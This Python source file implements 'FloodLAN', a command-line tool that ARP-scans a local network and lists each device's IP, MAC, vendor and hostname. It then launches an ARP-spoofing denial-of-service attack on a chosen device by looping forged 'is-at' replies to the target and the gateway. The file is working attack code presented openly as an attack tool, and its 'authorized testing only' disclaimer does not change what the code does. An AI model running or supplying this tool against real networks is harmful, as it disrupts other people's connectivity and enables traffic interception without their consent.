import logging
import os
import re
import socket
import time

import scapy.all as scapy
from mac_vendor_lookup import MacLookup
from pyfiglet import Figlet, figlet_format
from scapy.all import Ether, ARP, send, srp

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def get_device_name(ip):
    try:
        hostname = socket.gethostbyaddr(ip)
        return hostname[0]
    except socket.herror:
        return "UNKNOWN"


def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('10.254.224.254', 1))
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = '127.0.0.1'
    finally:
        s.close()
    return local_ip


def scan_network():
    local_ip = get_local_ip()
    network_range = (local_ip[:10 - len(local_ip)]) + "1/24"
    gateway_ip = (local_ip[:10 - len(local_ip)]) + "1"

    request = scapy.ARP()
    request.pdst = network_range
    broadcast = scapy.Ether()
    broadcast.dst = 'ff:ff:ff:ff:ff:ff'

    request_broadcast = broadcast / request
    clients = scapy.srp(request_broadcast, timeout=1, verbose=1)[0]

    print("\nScan Results:")
    print("     IP                MAC                Company             Device Name")
    count = 1

    arp_output = [re.findall('^[\w\?\.]+|(?<=\s)\([\d\.]+\)|(?<=at\s)[\w\:]+', i) for i in os.popen('arp -a')]
    arp_results = [dict(zip(['IP', 'LAN_IP', 'MAC_ADDRESS'], i)) for i in arp_output]
    arp_results = [{**i, **{'LAN_IP': i['LAN_IP'][1:-1]}} for i in arp_results]

    mac_to_ip = {}
    unknown_macs = []
    ip_to_mac = {}

    for item in arp_results:
        if 'MAC_ADDRESS' in item:
            if item["IP"] != "?":
                mac_to_ip[str(item["MAC_ADDRESS"])] = str(item["IP"]).replace(".localdomain", "")
            unknown_macs.append(item["MAC_ADDRESS"])
            ip_to_mac[item["MAC_ADDRESS"]] = item["LAN_IP"]

    LAN_IPs = []
    for element in clients:
        if (count / 5).is_integer():
            print("\n")
        mac = str(element[1].hwsrc)
        name = ""
        try:
            unknown_macs.remove(mac)
        except:
            pass
        LAN_IPs.append(element[1].psrc)
        add_space = ""
        if len(str(element[1])) == 12:
            add_space = " "
        try:
            try:
                company = MacLookup().lookup(mac)
                device_name = get_device_name(element[1].psrc).replace(".localdomain",
                                                                       "")  # Get device name using reverse DNS lookup
                print(
                    f"\033[1;31m[{count}] {element[1].psrc} {add_space}      {mac}      {company}      {device_name}\033[0m")
            except:
                print(
                    f"\033[1;31m[{count}] {element[1].psrc} {add_space}     {mac}      {company}      {get_device_name(element[1].psrc)}\033[0m")
        except:
            try:
                name = mac_to_ip[mac]
                print(
                    f"\033[1;31m[{count}] {element[1].psrc} {add_space}     {mac}                        {name}\033[0m")
            except:
                print(
                    f"\033[1;31m[{count}] {element[1].psrc} {add_space}     {mac}      UNIDENTIFIED      {get_device_name(element[1].psrc)}\033[0m")
        count += 1

    for mac in unknown_macs:
        if (count / 5).is_integer():
            print("\n")
        name = ""
        LAN_IPs.append(ip_to_mac[mac])
        add_space = ""
        if len(str(element[1])) == 12:
            add_space = " "
        try:
            try:
                name = mac_to_ip[str(mac)]
                company = str(MacLookup().lookup(str(mac)))
                device_name = get_device_name(ip_to_mac[mac]).replace(".localdomain",
                                                                      "")  # Get device name using reverse DNS lookup
                print(
                    f"\033[1;31m[{count}] {ip_to_mac[mac]} {add_space}     {str(mac)}      {company}      {device_name}\033[0m")
            except:
                print(
                    f"\033[1;31m[{count}] {ip_to_mac[mac]} {add_space}     {str(mac)}      {company}      {get_device_name(ip_to_mac[mac])}\033[0m")

        except:
            try:
                name = mac_to_ip[str(mac)]
                print(
                    f"\033[1;31m[{count}] {ip_to_mac[mac]} {add_space}     {str(mac)}                        {get_device_name(ip_to_mac[mac])}\033[0m")
            except:
                print(
                    f"\033[1;31m[{count}] {ip_to_mac[mac]} {add_space}     {str(mac)}      UNIDENTIFIED      {get_device_name(ip_to_mac[mac])}\033[0m")
        count += 1

    print("\n")
    return LAN_IPs


def dos(target_ip, gateway_ip, verbose=True):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, op='is-at')
    send(arp_response, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        print("\033[1;35mSent ARP response\033[0m: {} is-at {}".format(target_ip, gateway_ip))


def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


def restore(target_ip, gateway_ip, verbose=True):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac, op="is-at")
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("Sent to {}".format(target_ip))


def dos_device(LAN_IPs):
    while True:
        choose = input("\033[1;34mChoose A Number for DOS (or enter 'exit' to go back to the main menu): \033[0m")
        if choose.lower() == 'exit':
            return

        try:
            choose = int(choose)
            if 1 <= choose <= len(LAN_IPs):
                choose -= 1
                target = LAN_IPs[choose]
                gateway_ip = LAN_IPs[0]
                verbose = True

                print("\n" + figlet_format("DOS HAS STARTED", font="small"))
                print("\033[1;32mCTRL+C TO STOP DOS\033[0m\n")

                try:
                    while True:
                        dos(target, gateway_ip, verbose)
                        dos(gateway_ip, target, verbose)
                        time.sleep(0.5)
                except KeyboardInterrupt:
                    print("\033[1;31mDOS STOPPED: Restoring the network\033[0m")
                    restore(target, gateway_ip)
                    restore(gateway_ip, target)
                    break
            else:
                print("\033[1;31mInvalid number. Please choose a valid number from the list.\033[0m")
        except ValueError:
            print("\033[1;31mInvalid input. Please enter a number or 'exit' to go back to the main menu.\033[0m")


def print_help():
    print("\033[1mFloodLAN - Help\033[0m\n")
    print("\033[1;34m1. Scan network devices:\033[0m")
    print("   This option will scan your local network for connected devices.")
    print("   It will display the IP address, MAC address, company name, and device name (if available).")
    print("   To use this feature, simply select option '1' from the main menu.")

    print("\n\033[1;34m2. DoS Attack on a device:\033[0m")
    print("   This option allows you to perform a Denial of Service (DoS) attack on a specific device.")
    print("   You will need to choose a number from the list of scanned devices to target.")
    print("   Once selected, the DoS attack will start, and you can stop it using CTRL+C.")
    print("   To use this feature, first, select option '1' to scan the network, then select option '2'.")

    print("\n\033[1;34m3. Help:\033[0m")
    print("   This option provides helpful information about using the FloodLAN tool.")
    print("   To access the help page, select option '3' from the main menu.")

    print("\n\033[1;34m4. Exit:\033[0m")
    print("   This option allows you to exit the FloodLAN tool.")
    print("   To exit the script, select option '4' from the main menu.")

    print("\n\033[1;34m5. Note:\033[0m")
    print("   - The displayed company name might not always be accurate.")
    print("   - The MAC address vendor lookup database might not have the latest information.")
    print("   - Therefore, the company name displayed may not reflect the actual device manufacturer.")
    print("   - Additionally, some devices may have custom MAC addresses, leading to unidentified results.")
    print("   - Use this information as a reference but not as the sole basis for device identification.")
    print("   - Always verify device details through other means for critical assessments.")

    print("\n\033[1;34mNotice:\033[0m")
    print("   - Performing DoS attacks is illegal and unethical without proper authorization.")
    print("   - This tool is intended for educational and authorized testing purposes only.")
    print("   - Misusing the DoS attack feature may cause harm to network devices and violate laws and regulations.")
    print("   - Use this tool responsibly and always with proper authorization.\n\n\n\n")


def main():
    os.system("clear")
    custom_fig = Figlet(font='big')
    banner = custom_fig.renderText('FloodLAN')

    print("\033[1;33m{}\033[0m".format(banner))
    print("\033[1;31mFloodLAN - Local Area Network Scanner & DoS Tool\033[0m\n")

    while True:
        print("\033[1;34mMain Menu:\033[0m")
        print("1. \033[1mScan network devices\033[0m")
        print("2. \033[1mDoS Attack on a device\033[0m")
        print("3. \033[1mHelp\033[0m")
        print("4. \033[1mExit\033[0m")

        choice = input("\n\033[1;33mEnter your choice: \033[0m")

        if choice == '1':
            LAN_IPs = scan_network()
        elif choice == '2':
            if 'LAN_IPs' in locals():
                dos_device(LAN_IPs)
            else:
                print("\033[1;31mPlease scan the network first.\033[0m")
        elif choice == '3':
            print_help()
        elif choice == '4':
            break
        else:
            print("\033[1;31mInvalid choice. Please select a valid option.\033[0m")


if __name__ == "__main__":
    main()
